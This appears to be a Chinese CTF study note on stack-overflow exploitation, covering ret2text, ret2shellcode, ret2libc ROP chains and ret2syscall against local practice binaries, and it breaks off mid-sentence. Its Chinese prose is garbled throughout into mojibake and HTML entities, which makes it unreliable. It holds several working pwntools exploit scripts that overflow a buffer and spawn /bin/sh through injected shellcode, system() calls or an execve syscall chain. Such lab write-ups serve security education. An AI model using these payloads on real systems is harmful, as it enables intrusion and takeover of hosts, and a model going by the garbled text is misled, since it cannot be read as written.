ret2text(è¦†ç›–è¿”å›åœ°å€)è¯¥å‡½æ•°å†…å­˜åœ¨getæ¼æ´ è¯¥å‡½æ•°æ³„éœ²äº†åé—¨å‡½æ•° æ¥ç€é€šè¿‡getså‡½æ•°æ ˆæº¢å‡ºå°†è¿™ä¸ªåœ°å€æ”¹ä¸ºtargetï¼Œé‚£ä¹ˆvulnfuncè¿”å›çš„æ—¶å€™ï¼Œç”¨retæŒ‡ä»¤å–å‡ºæ ˆé¡¶çš„å…ƒç´ è¿”å›ï¼Œå°±ä¼šè¿”å›åˆ°targetè¿™ä¸ªå‡½æ•° targetå‡½æ•°ä¸­æœ‰systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰è¿™ä¸ªåé—¨ï¼Œç±»ä¼¼äºåœ¨Linuxçš„ç»ˆç«¯ç›´æ¥è°ƒç”¨&#x2F;bin&#x2F;shã€‚åˆ©ç”¨è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªshellï¼Œè¿›è€Œå¾—åˆ°ç›®æ ‡ä¸»æœºçš„shellï¼Œæ‹¿åˆ°æ§åˆ¶æƒã€‚ æ‰¾å¡«å……å­—èŠ‚ ç›´æ¥ä»IDAä¸­è¯»å‡ºé•¿åº¦ såˆ°vulnfuncçš„ebpçš„è·ç¦»æ˜¯108hï¼Œæ‰€ä»¥åˆ°main_nextçš„è·ç¦»æ˜¯0x108+4 é‚£ä¸ª4æ˜¯32ä½çš„ebpçš„ç©ºé—´ è„šæœ¬1234567from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive() ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰Shellcodeæ˜¯æœºå™¨ç æ ¼å¼çš„æ¶æ„ä»£ç ï¼ŒæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤ printf(&quot;%p\\n&quot;, s)è¾“å‡ºäº†Sçš„ç¼“å†²åŒºçš„ä½ç½® æ²¡æœ‰å¼€å¯NXä¿æŠ¤ æ‰€ä»¥å¯ä»¥å‘è¿›ç¨‹ä¸­å†™å…¥ä¸€æ®µShellcodeï¼ˆåˆ©ç”¨wå†™æƒé™ï¼‰ï¼Œå†æ‰§è¡Œè¿™æ®µShellcodeï¼ˆåˆ©ç”¨xæ‰§è¡Œæƒé™ï¼‰ã€‚ è„šæœ¬1234567891011from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive() context.arch = &quot;i386&quot;è¯´æ˜ç¨‹åºçš„æ¶æ„ï¼Œä½¿ç”¨ asm() å‡½æ•°å°† shellcode (shellcraft.sh()) æ±‡ç¼–æˆæœºå™¨ç æ—¶ï¼Œpwntools éœ€è¦çŸ¥é“ç›®æ ‡æ¶æ„æ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ï¼Œä»¥ä¾¿ç”Ÿæˆæ­£ç¡®çš„æŒ‡ä»¤é›†ã€‚32 ä½å’Œ 64 ä½çš„æŒ‡ä»¤æ˜¯ä¸åŒçš„ã€‚ target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) æ¥æ”¶çŸ¥é“è¯»å–åˆ°&#x2F;nï¼Œ(è¾“å‡ºçš„ç¼“å†²åŒºçš„åœ°å€)ï¼Œè½¬åŒ–ä¸ºåå…­è¿›åˆ¶æ•´æ•°ï¼Œä¸”drop = Trueæ–¹ä¾¿åœ°æ¸…ç†ä½ æ¥æ”¶åˆ°çš„æ•°æ®ã€‚åªæå–æŸä¸ªæ¨¡å¼ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ°å€ã€ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼‰è€Œä¸åŒ…å«ç”¨äºåˆ†éš”æˆ–ç»ˆæ­¢çš„å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ã€ç©ºæ ¼ã€å†’å·ç­‰ï¼‰ sc = asm(shellcraft.sh())ç”Ÿæˆå¯åŠ¨/bin/shçš„æœºå™¨ç  payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) ä»å³åˆ°å·¦å…¥æ ˆï¼Œp32(target):è¦†ç›–è¿”å›åœ°å€ï¼Œbâ€™aâ€™ * (0x108 + 4 - len(sc)):å¡«å……ä»scç»“æŸä½ç½®åˆ°è¿”å›åœ°å€ä¹‹é—´æ‰€æœ‰â€œæ— ç”¨â€çš„æ ˆç©ºé—´ã€‚sc:å½“ scä½äºç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚ context(arch &#x3D; â€˜amd64â€™, os &#x3D; â€˜linuxâ€™, log_level &#x3D; â€˜debugâ€™) è¿™ç§contextçš„ä¿¡æ¯å¯ä»¥é€šè¿‡æŒ‡ä»¤file+æ–‡ä»¶å å¾—åˆ° è¾“å‡ºç¤ºä¾‹ï¼š 1mrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, â€¦ è¿™é‡Œå…³é”®çš„ä¿¡æ¯ï¼š ELF â†’ è¯´æ˜æ˜¯ Linux 64-bit â†’ è¯´æ˜æ˜¯ 64 ä½ x86-64 â†’ æ¶æ„å°±æ˜¯ amd64ï¼ˆpwntools é‡Œå†™ amd64ï¼‰ å¦‚æœè¾“å‡ºæ˜¯ï¼š 1ELF 32-bit LSB executable, Intel 80386 é‚£ä½ å°±ç”¨ï¼š 1context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) å¦‚æœæ˜¯ï¼š 1ELF 32-bit LSB executable, ARM é‚£ä½ å°±ç”¨ï¼š 1context(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;) ropNX ä¿æŠ¤ (No-Execute): å®ƒçš„å”¯ä¸€ç›®çš„æ˜¯é˜»æ­¢ä½ åœ¨æ•°æ®åŒºåŸŸï¼ˆæ¯”å¦‚æ ˆå’Œå †ï¼‰æ‰§è¡Œä»£ç ã€‚ä½ å¯ä»¥æŠŠæ ˆå’Œå †æƒ³è±¡æˆä¸€å—â€œåªå†™æ•°æ®ï¼Œä¸èƒ½è·‘ç¨‹åºâ€çš„åŒºåŸŸã€‚ å…è®¸ä»€ä¹ˆï¼Ÿ å…è®¸ä½ åœ¨æ ˆä¸Šå†™æ•°æ®ï¼ˆæ¯”å¦‚å¡«å……å­—ç¬¦ä¸² AAAAï¼Œæˆ–è€…ä¸€äº›åœ°å€ï¼‰ã€‚ å…è®¸ä½ ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ã€‚ å…è®¸ä½ è¦†ç›–è¿”å›åœ°å€ã€‚ é˜»æ­¢ä»€ä¹ˆï¼Ÿ é˜»æ­¢ä½ æŠŠè‡ªå·±çš„æ±‡ç¼–ä»£ç ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º Shellcodeï¼‰æ”¾åœ¨æ ˆä¸Šï¼Œç„¶åè®©ç¨‹åºå»æ‰§è¡Œå®ƒã€‚ ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰ç¬¬ä¸€æ­¥ï¼Œå…ˆçœ‹ä¿æŠ¤ getæº¢å‡º systemå‡½æ•°å­˜åœ¨,ä½†å‚æ•°ä¸æ˜¯&#x2F;bin&#x2F;sh systemå‡½æ•°å­˜åœ¨,å¹¶ä¸”ç¨‹åºä¸­å¿ƒå­˜åœ¨bin&#x2F;shå­—ç¬¦ä¸² æ‰€ä»¥å¯ä»¥æŠŠbin&#x2F;shä½œä¸ºå‚æ•°ä¼ å…¥systemå‡½æ•°ä¸­æ„é€ åé—¨å‡½æ•° è¦æ„é€ ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œå…ˆè°ƒç”¨systemå‡½æ•°ï¼Œç„¶åæŒ‰ç…§è°ƒç”¨æµç¨‹ï¼Œå‚æ•°ï¼ˆbin&#x2F;shå­—ç¬¦ä¸²æ‰€åœ¨çš„ä½ç½®ï¼‰å…¥æ ˆï¼Œè¿”å›åœ°å€å…¥æ ˆ payloadçš„å½¢å¼æ˜¯**[åƒåœ¾å¡«å……] + [systemå‡½æ•°åœ°å€] + [systemè¿”å›åœ°å€] + [binshå­—ç¬¦ä¸²åœ°å€]** è„šæœ¬12345678910111213from pwn import *context.arch = &quot;i386&quot; # å¼ºçƒˆå»ºè®®åŠ ä¸Šè¿™ä¸€è¡Œp = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # è°ƒè¯•æ—¶å¯ç”¨#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # ç¡®ä¿è¿™ä¸ªåœ°å€ç¡®å®åŒ…å« &quot;/bin/sh&quot; å­—ç¬¦ä¸²p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive() æ‰¾åˆ°systemå‡½æ•°ä½ç½® elf = ELF(&quot;./ret2libc1&quot;) system = elf.plt[&quot;system&quot;]ç›´æ¥æ‰¾åˆ°systemdçš„å…¥å£ æ³¨æ„ [systemè¿”å›åœ°å€] ä¸èƒ½ä¹±å†™ï¼Œåé—¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šè¿”å›è¿™ä¸ªåœ°å€ï¼Œé”™è¯¯çš„åœ°å€ä¼šå¼•å‘å´©æºƒ 1.elf.plt[&quot;exit&quot;] (æœ€å¸¸ç”¨ï¼Œæ¨è)ï¼š ä½œç”¨ï¼šè®© system(&quot;/bin/sh&quot;) æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºèƒ½å¤Ÿå¹²å‡€åœ°è°ƒç”¨ exit() å‡½æ•°å¹¶é€€å‡ºã€‚è¿™æ˜¯æœ€æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†ç¨‹åºçš„æ­£å¸¸ç»ˆæ­¢ã€‚ ä¼˜ç‚¹ï¼šç¨³å®šã€å¯é ï¼Œä¸ä¼šå¯¼è‡´å´©æºƒã€‚ è·å–æ–¹å¼ï¼šelf.plt[&quot;exit&quot;] (pwntools ä¼šè‡ªåŠ¨è§£æ)ã€‚ 2.0x0 æˆ–å…¶ä»–æ— æ•ˆåœ°å€ (å¯¼è‡´å´©æºƒ)ï¼š ä½œç”¨ï¼šå¦‚æœä½ åªå…³å¿ƒ system(&quot;/bin/sh&quot;) æ˜¯å¦è¢«æ‰§è¡Œï¼Œè€Œä¸å…³å¿ƒç¨‹åºæ˜¯å¦å´©æºƒï¼Œé‚£ä¹ˆå¯ä»¥éšä¾¿å¡«ã€‚ ä¼˜ç‚¹ï¼šæœ€ç®€å•ã€‚ ç¼ºç‚¹ï¼šç¨‹åºä¼šå´©æºƒï¼Œè¿™åœ¨å®é™…æ”»é˜²ä¸­é€šå¸¸æ˜¯ä¸å¸Œæœ›çœ‹åˆ°çš„ã€‚æœ‰æ—¶è°ƒè¯•æ—¶ä¸ºäº†å¿«é€ŸéªŒè¯ system æ˜¯å¦è¢«è°ƒç”¨ï¼Œå¯èƒ½ä¼šæš‚æ—¶ä½¿ç”¨ã€‚ ret2libc2(ä¸¤ä¸ªå‡½æ•°çš„ropé“¾) è¯¥é¢˜æ²¡æœ‰bin&#x2F;shå­—ç¬¦ä¸² æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»é€šè¿‡getæ„é€  (1)funcå‡½æ•°é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€ä¸ºgets_addr,ä¼ å…¥get()çš„å‚æ•°ï¼Œbä½œä¸ºgetå‡½æ•°åº•è‰²å‚æ•°ï¼Œå³å…¶ä»ç»ˆç«¯è¯»å–çš„æ•°æ®è¦å­˜å…¥çš„åœ°æ–¹ ï¼ˆ) ï¼ˆ2ï¼‰getå‡½æ•°è¢«è°ƒç”¨åä¼šä¸ºè‡ªå·±å¼€è¾Ÿç©ºé—´ï¼Œæ‰§è¡Œæ—¶å†æ¬¡é€šè¿‡æ ˆæº¢å‡ºå¡«å…¥systemå‡½æ•°çš„åœ°å€å’Œå‚æ•°ï¼Œæœ€åè°ƒç”¨systemæ‰§è¡Œæ„é€ å¥½çš„åé—¨å‡½æ•° åˆ†æä¹‹åå¾—åˆ°åº”è¯¥æ„é€ å¦‚ä¸‹å½¢å¼çš„payload å…¶ä¸­get()å‡½æ•°å’Œsyså‡½æ•°çš„å‚æ•°éƒ½æ˜¯bssæ®µï¼Œget()ç”¨æ¥æŠŠbin&#x2F;shå†™å…¥bssæ®µï¼Œsyså’Œå®ƒæ„æˆåé—¨å‡½æ•° getå†™å…¥bssæ®µçš„å†…å®¹éœ€è¦ä»ç»ˆç«¯è¯»å–ï¼Œæ‰€ä»¥ä¹‹åè¿˜è¦ä¸ºå…¶å‘é€ä¸€ä¸ªâ€œbin&#x2F;shâ€ Payloadçš„å½¢å¼æ˜¯p32ï¼ˆgets_addrï¼‰+p32ï¼ˆsystem_addrï¼‰+p32ï¼ˆgets_p1ï¼‰+p32ï¼ˆsystem_p1ï¼‰ã€‚ å¼€å¯äº†NXä¿æŠ¤ï¼Œå†™å’Œè¿è¡Œä¸èƒ½åŒæ—¶å®ç°ï¼Œæ‰€ä»¥æ”¹å˜è¯¥å‡½æ•°çš„å‚æ•°ä½ç½®ï¼Œæ‰€ä»¥æŠŠ /bin/shï¼‰å†™å…¥ä¸€ä¸ªå¯å†™çš„å†…å­˜åŒºåŸŸã€‚.bss æ®µæ˜¯ä¸€ä¸ªéå¸¸ç†æƒ³çš„é€‰æ‹©ï¼Œå› ä¸ºå®ƒï¼š å¯å†™ é€šå¸¸ä½äºå›ºå®šçš„åœ°å€ï¼ˆç‰¹åˆ«æ˜¯åœ¨ æ²¡æœ‰å¼€å¯ ASLR çš„æƒ…å†µä¸‹ï¼‰ï¼› åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æœªåˆå§‹åŒ–çš„æ•°æ®éƒ½å­˜å‚¨åœ¨è¿™é‡Œã€‚ æ‰¾bssåœ°å€ 1.readelf readelf -S ret2libc2 2.gdbè°ƒè¯• gdb ./ret2libc2 info files æ˜¾ç¤ºäº†bssæ®µçš„å§‹æœ«ä½ç½® 3.è„šæœ¬ä¸­ç›´æ¥å¾—åˆ° elf.bss() è„šæœ¬12345678910111213from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() gdbè°ƒè¯•æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥ cä¸€ä¸‹è¿è¡Œåˆ°ä¸‹æ–­ç‚¹ä½ç½® è¿™ä¸ªæ—¶å€™ç¬¬ä¸€ä¸ªgetå·²ç»å®ç°ï¼Œpayloadå·²ç»ä¼ å…¥äº† ä¸‹ä¸€æ­¥ä¼šè¿›å…¥æˆ‘ä»¬ä¼ è¿›å»çš„getä¸­ get å’Œsystemå‡½æ•°éƒ½æ‰§è¡Œç»“æŸå x/s 0x0804a040å‘ç°bsså†…å­˜å…¥äº†bin&#x2F;sh ret2libc2(å¤šä¸ªå‡½æ•°çš„ropé“¾)å‡è®¾ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é‡Œä»…æœ‰readå‡½æ•°ï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆfdï¼Œaddrå’Œlengthï¼‰ è¿™æ˜¯æŒ‰ç…§ä¸¤ä¸ªropé“¾å†™å‡ºçš„payloadå¡«è¡¥å½¢å¼ å‡½æ•°readå› ä¸ºæ‹¥æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç›¸åº”åœ°åœ¨æ ˆä¸Šéœ€è¦æœ‰ä¸‰ä¸ªå—çš„ç©ºé—´ã€‚è¿™æ—¶ï¼Œsystemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®å°±ä¼šå’Œreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®å†²çªï¼Œå¯¼è‡´æ— æ³•å°†systemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®åœ¨æ ˆä¸Šã€‚ä¸æ–¹ä¾¿ç›´æ¥è¦†ç›–ï¼Œå› ä¸ºreadçš„å‚æ•°é™åˆ¶æ¯”è¾ƒå¤š æ‰€ä»¥è¿™ç§æƒ…å†µå°±å¯ä»¥ç”¨pop&#x2F;retè¿›è¡Œ æ³¨æ„é€‰å–çš„åŸºæœ¬åŸåˆ™ï¼šæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopæŒ‡ä»¤ï¼Œæ¯”å¦‚è°ƒç”¨å®Œgetså‡½æ•°ä¹‹åï¼Œå› ä¸ºgetså‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€æœ‰å¯ä»¥å°†getså‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸º0x0804862Fï¼Œå³åªæ‰§è¡Œä¸€ä¸ªpopæŒ‡ä»¤å¼¹å‡ºå‚æ•°ä¹‹åå°±æ˜¯retæŒ‡ä»¤ï¼›æ¯”å¦‚readå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå°±æ‰¾0x0804862Dè¿™ä¸ªä½ç½®ï¼Œå› ä¸ºè¿™ä¸ªä½ç½®çš„æŒ‡ä»¤æ˜¯3ä¸ªpopæŒ‡ä»¤åŠ ä¸Šä¸€ä¸ªretæŒ‡ä»¤ å¦‚ä½•å¯»æ‰¾è‹¥å¹²ä¸ªpopæŒ‡ä»¤è·Ÿç€retæŒ‡ä»¤ ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot; (ROPgadgetç”¨äºæŸ¥æ‰¾ç”¨æ¥æ”»å‡»çš„å¯æ‰§è¡Œä»£ç ç‰‡æ®µï¼Œè€Œreadlfæ˜¯ç¨‹åºçš„æ•´ä½“ç»“æ„å’Œå†…å­˜å¸ƒå±€) è„šæœ¬12345678910111213141516from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() payload += p32(get) + p32(pop1_ret) + p32(bss): ç›˜å­æ¯”å–» å‡†å¤‡ ROP é“¾ï¼ˆå †å ç›˜å­ï¼‰ï¼š ä½ åœ¨å†…å­˜çš„æ ˆä¸Šï¼Œä»ä¸‹å¾€ä¸Šï¼ˆä¹Ÿå°±æ˜¯ä»ä½åœ°å€å¾€é«˜åœ°å€ï¼Œå› ä¸ºæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼‰ï¼Œåƒå †å ç›˜å­ä¸€æ ·æ”¾äº†ä¸€ç³»åˆ—åœ°å€ã€‚ å‡è®¾ä½ çš„ ROP é“¾ç‰‡æ®µæ˜¯ï¼šA (getåœ°å€), B (pop ebp; retåœ°å€), C (bssåœ°å€)ã€‚ æ ˆä¸Šçš„ç›˜å­ï¼š 1234... (å…¶ä»–æ•°æ®)[ C ç›˜å­ (bssåœ°å€) ] &lt;-- ä½äºæ ˆä¸Šè¾ƒé«˜ä½ç½®[ B ç›˜å­ (pop ebp; retåœ°å€) ][ A ç›˜å­ (getåœ°å€) ] &lt;-- ä½äºæ ˆä¸Šè¾ƒä½ä½ç½®ï¼Œæœ€å…ˆè¢«ç¨‹åºâ€œçœ‹åˆ°â€ å½“ç¨‹åºè¿”å›æ—¶ï¼Œä¼šå…ˆâ€œæ‹¿èµ·â€æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆAï¼‰ã€‚ æ‰§è¡Œ get å‡½æ•°ï¼ˆä½¿ç”¨ A ç›˜å­ï¼‰ï¼š ç¨‹åºå› ä¸ºæ ˆæº¢å‡ºè¢«åŠ«æŒï¼Œå®ƒä¼šè·³åˆ° get å‡½æ•°çš„åœ°å€ï¼ˆA ç›˜ï¼‰ã€‚ get å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚å®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€æ¥å­˜æ”¾å®ƒè¯»å–çš„æ•°æ®ã€‚ get å‡½æ•°ä¼šå»â€œçœ‹â€å®ƒè‡ªå·±è¿”å›åœ°å€ä¸Šæ–¹çš„â€œç›˜å­â€ï¼Œä¹Ÿå°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚ æ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) è¢« get å‡½æ•°å½“ä½œäº†å®ƒçš„å‚æ•°ï¼Œget ä¼šå°†ä½ é€šè¿‡ p.sendline(&quot;/bin/sh&quot;) å‘é€çš„æ•°æ®å†™å…¥åˆ° C ç›˜å­ æ‰€æŒ‡ç¤ºçš„å†…å­˜åŒºåŸŸï¼ˆå³ bss æ®µï¼‰ã€‚ get å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå®ƒéœ€è¦â€œè¿”å›â€ã€‚å®ƒä¼šä»æ ˆä¸Šå–å›å®ƒçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯ç´§é‚»å…¶ä¸‹çš„ B ç›˜å­ (pop ebp; retåœ°å€)ã€‚ æ‰§è¡Œ pop ebp; ret gadgetï¼ˆä½¿ç”¨ B ç›˜å­ï¼‰ï¼š ç¨‹åºè·³è½¬åˆ° B ç›˜å­ (pop ebp; retåœ°å€)ã€‚ ç°åœ¨ï¼ŒB ç›˜å­ å†…éƒ¨çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼š pop ebpï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆé¡¶çš„é‚£ä¸ªç›˜å­ã€‚æ­¤æ—¶æ ˆé¡¶å°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚æ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) ä¼šè¢«å¼¹å‡ºå¹¶æ”¾å…¥ ebp å¯„å­˜å™¨ã€‚è¿™ä¸ªæ“ä½œç›¸å½“äºæŠŠ C ç›˜å­ ä»æ ˆä¸­æ‹¿èµ°äº†ã€‚ retï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆä¸­ç°åœ¨æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆä¹Ÿå°±æ˜¯ C ç›˜å­ è¢«æ‹¿èµ°åæš´éœ²å‡ºçš„ä¸‹ä¸€ä¸ªç›˜å­ï¼‰ï¼Œå¹¶è·³è½¬åˆ°é‚£ä¸ªç›˜å­ä¸Šçš„åœ°å€ã€‚è¿™ä¸ªç›˜å­å°±æ˜¯ä½  ROP é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼ˆä¾‹å¦‚ sys å‡½æ•°çš„åœ°å€ï¼‰ã€‚ ret2syscall(åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€) å¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ ROPé“¾å®ç°è·³è½¬ï¼Œè€Œä¸æ”¹å˜æ•°æ®æ®µçš„æ•°å€¼ é™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä¸Šé¢æœ‰æ•ˆçš„ä¸œè¥¿äº†,æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­éƒ½æ²¡æœ‰systemå‡½æ•° æ‰€ä»¥è‡ªå·±ä¸ºå¯„å­˜å™¨èµ‹å€¼ä»¥æ„é€ åé—¨å‡½æ•°ã€‚ä¸”è°ƒç”¨çš„int 0x80è¦æ”¾åœ¨æœ€ä¸Šé¢ï¼Œè°ƒç”¨æ—¶ï¼Œä»ä¸‹å¾€ä¸Šå¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œåˆ°è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œè¯¥å‡½æ•°çš„å‚æ•°å¿…é¡»å‡†å¤‡å¥½ã€ æ ¹æ®å‘½ä»¤æ‰¾åˆ°&#x2F;bin&#x2F;shå­—ç¬¦æ®µ å’Œint 0x80çš„è°ƒç”¨å‘½ä»¤ä»¥åŠéœ€è¦çš„pop|retå‘½ä»¤ è„šæœ¬12345678910111213141516171819from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive() å‡½æ•°è°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨ ç‰¹ç‚¹ å‡½æ•°è°ƒç”¨ ç³»ç»Ÿè°ƒç”¨ é¢å‘ æ™®é€šç¨‹åº å†…æ ¸ å…¥å£ call func syscall æŒ‡ä»¤ å‚æ•°çº¦å®š System V ABI (RDI, RSI, RDX, RCX, R8, R9, â€¦) Linux syscall ABI (RDI, RSI, RDX, R10, R8, R9) è°ƒç”¨å¯¹è±¡ ç”¨æˆ·æ€çš„å‡½æ•°ï¼ˆå¯èƒ½æ˜¯ libc å°è£…ï¼‰ å†…æ ¸çš„æœåŠ¡ï¼ˆæ–‡ä»¶ã€è¿›ç¨‹ã€ç½‘ç»œç­‰ï¼‰ è¿”å›ä½ç½® RAX RAX ä½¿ç”¨åœºæ™¯ æ™®é€šä»£ç è°ƒç”¨åº“å‡½æ•° æ‰‹å†™ shellcodeã€ROP ç›´æ¥è°ƒç”¨å†…æ ¸æœåŠ¡ ç¼–è¯‘çŸ¥è¯†ï¼ˆ1ï¼‰é™æ€ç¼–è¯‘ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæå–å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦è°ƒç”¨çš„å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.soï¼‰ä¸­çš„éƒ¨åˆ†ï¼Œå¹¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ å»ï¼Œä½¿å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œçš„æ—¶å€™ä¸ä¾èµ–äºåŠ¨æ€é“¾æ¥åº“ã€‚ ï¼ˆ2ï¼‰åŠ¨æ€ç¼–è¯‘ã€‚åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦é™„å¸¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œéœ€è¦è°ƒç”¨å…¶å¯¹åº”åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥ï¼Œå…¶ä¼˜ç‚¹ä¸€æ–¹é¢æ˜¯ ç¼©å°äº†å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œä¼˜ç‚¹åŠ 